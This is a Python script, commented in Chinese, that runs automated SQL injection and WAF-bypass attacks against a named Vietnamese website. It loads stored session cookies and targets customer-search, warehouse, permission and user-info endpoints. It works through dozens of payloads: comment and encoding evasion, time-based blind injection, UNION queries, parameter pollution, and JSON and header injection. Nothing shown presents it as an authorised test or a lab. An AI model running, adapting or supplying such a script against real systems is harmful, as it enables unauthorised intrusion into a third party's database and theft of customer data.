#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import time
import json
from urllib.parse import urljoin, quote, quote_plus
import urllib3
urllib3.disable_warnings()

class SQLiBypass:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    # WAF绕过Payload
    BYPASS_PAYLOADS = [
        # 注释绕过
        "'/**/OR/**/1=1--",
        "'/*!OR*/1=1--",
        "'/**/UNION/**/SELECT/**/NULL--",
        "'/*!50000UNION*//*!50000SELECT*/NULL--",
        "'/*!UNION*//*!SELECT*/NULL--",
        
        # 编码绕过
        "' OR 1=1--",
        "'%20OR%201=1--",
        "'%09OR%091=1--",
        "'%0AOR%0A1=1--",
        "'%0DOR%0D1=1--",
        "'%0COR%0C1=1--",
        "'%00OR%001=1--",
        
        # 大小写混淆
        "' Or 1=1--",
        "' oR 1=1--",
        "' OR 1=1--",
        "' UnIoN SeLeCt NULL--",
        
        # 双重编码
        "'%2520OR%25201=1--",
        "'%2500OR%25001=1--",
        
        # 空格替换
        "'+OR+1=1--",
        "'(OR)1=1--",
        "'/**/OR/**/1=1--",
        "'/*comment*/OR/*comment*/1=1--",
        
        # 函数绕过
        "' OR CHAR(49)=CHAR(49)--",
        "' OR ASCII('a')=97--",
        "' OR LENGTH('a')=1--",
        
        # 逻辑绕过
        "' OR 1=1 LIMIT 1--",
        "' OR 1=1#",
        "' OR 1=1/*",
        "' OR 1=1-- ",
        "' OR '1'='1",
        "') OR ('1'='1",
        "' OR 1=1 AND '1'='1",
        
        # 时间盲注绕过
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "' AND SLEEP(5) AND '1'='1",
        "' OR SLEEP(5) OR '1'='1",
        "'; WAITFOR DELAY '00:00:05'--",
        
        # 联合查询绕过
        "' UNION SELECT NULL--",
        "' UNION ALL SELECT NULL--",
        "' UNION SELECT 1,2,3--",
        "' UNION SELECT NULL,NULL,NULL--",
        "' UNION SELECT 1,2,3,4,5--",
        
        # 内联注释
        "'/*!50000OR*/1=1--",
        "'/*!UNION*//*!SELECT*/NULL--",
        "'/*!50000UNION*//*!50000SELECT*/NULL--",
    ]
    
    def test_bypass(self, endpoint, param_name, param_value=""):
        """测试WAF绕过"""
        if '?' in endpoint:
            base_url = endpoint.split('?')[0]
            if param_value:
                url = f"{base_url}?{param_name}={param_value}"
            else:
                url = endpoint
        else:
            url = f"{endpoint}?{param_name}={param_value}"
        
        full_url = urljoin(self.base_url, url)
        
        for payload in self.BYPASS_PAYLOADS:
            try:
                test_url = f"{full_url.split('?')[0]}?{param_name}={quote(payload)}"
                start_time = time.time()
                r = self.session.get(test_url, timeout=10)
                elapsed = time.time() - start_time
                
                # 检查时间延迟
                if elapsed >= 4.5:
                    print(f"[!] 时间盲注绕过: {param_name}={payload[:40]}... (延迟: {elapsed:.2f}s)")
                    return True, payload, 'time-based'
                
                # 检查错误信息
                content_lower = r.text.lower()
                if any(err in content_lower for err in ['sql', 'mysql', 'error', 'syntax']):
                    print(f"[!] 错误注入绕过: {param_name}={payload[:40]}...")
                    return True, payload, 'error-based'
                
                # 检查响应差异
                if r.status_code == 200 and len(r.content) > 50:
                    print(f"[+] 绕过成功: {param_name}={payload[:40]}... [{r.status_code}]")
                    return True, payload, 'confirmed'
                
            except Exception as e:
                pass
        
        return False, None, None
    
    def test_all_endpoints_bypass(self):
        """测试所有端点WAF绕过"""
        print("[*] WAF绕过测试...\n")
        
        endpoints = [
            ("/Handle/SearchListCustomer", "q"),
            ("/Handle/SearchListCustomer", "search"),
            ("/Handle/SearchListCustomer", "keyword"),
            ("/Handle/SearchListProvince", "type"),
            ("/Handle/SearchListWardByDistrictID", "DistrictID"),
            ("/Handle/SearchListDistrictByProvinceID", "ProvinceID"),
            ("/Handle/SearchListWareHouse", "id"),
            ("/Handle/SearchListProductVariantByWareHouseID", "WareHouseID"),
            ("/Handle/SearchListFunctionalByGroupPermissionID", "GroupPermissionID"),
            ("/Handle/SearchPWDByVNPMapsSearch", "q"),
            ("/Handle/SearchPWDByEMSMapsSearch", "q"),
            ("/Account/GetUserInfo", "id"),
        ]
        
        results = []
        for endpoint, param in endpoints:
            print(f"[*] 测试: {endpoint} (参数: {param})")
            success, payload, vuln_type = self.test_bypass(endpoint, param)
            if success:
                results.append({
                    'endpoint': endpoint,
                    'param': param,
                    'payload': payload,
                    'type': vuln_type
                })
            time.sleep(0.3)
        
        return results
    
    def advanced_techniques(self):
        """高级绕过技术"""
        print("[*] 高级绕过技术测试...\n")
        
        # 1. HTTP参数污染
        print("[1] HTTP参数污染测试...")
        test_url = urljoin(self.base_url, "/Handle/SearchListCustomer")
        try:
            r = self.session.get(test_url, params={
                'q': "test",
                'q': "' OR 1=1--",
                'search': "normal",
                'search': "' UNION SELECT NULL--"
            }, timeout=5)
            if r.status_code == 200:
                print(f"    [+] 参数污染可能有效")
        except:
            pass
        
        # 2. JSON注入
        print("[2] JSON注入测试...")
        json_endpoints = [
            "/Handle/SearchListCustomer",
            "/Handle/SearchListWareHouse",
        ]
        
        json_payloads = [
            {"q": "' OR 1=1--"},
            {"search": "' UNION SELECT NULL--"},
            {"id": "1' OR 1=1--"},
        ]
        
        for endpoint in json_endpoints:
            url = urljoin(self.base_url, endpoint)
            for payload in json_payloads:
                try:
                    r = self.session.post(url, json=payload, timeout=5)
                    if r.status_code == 200:
                        print(f"    [+] JSON注入: {endpoint}")
                except:
                    pass
        
        # 3. Header注入
        print("[3] Header注入测试...")
        header_payloads = {
            'X-Forwarded-For': "' OR 1=1--",
            'X-Real-IP': "' UNION SELECT NULL--",
            'User-Agent': "' OR 1=1--",
            'Referer': "' OR 1=1--",
        }
        
        test_url = urljoin(self.base_url, "/Handle/SearchListCustomer")
        for header, payload in header_payloads.items():
            try:
                r = self.session.get(test_url, headers={header: payload}, timeout=5)
                if r.status_code == 200:
                    print(f"    [+] Header注入: {header}")
            except:
                pass
    
    def run_all(self):
        """执行所有绕过测试"""
        results = self.test_all_endpoints_bypass()
        self.advanced_techniques()
        
        with open('sqli_bypass_results.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print(f"\n[+] 发现 {len(results)} 个可绕过WAF的SQL注入")

if __name__ == "__main__":
    bypass = SQLiBypass()
    bypass.run_all()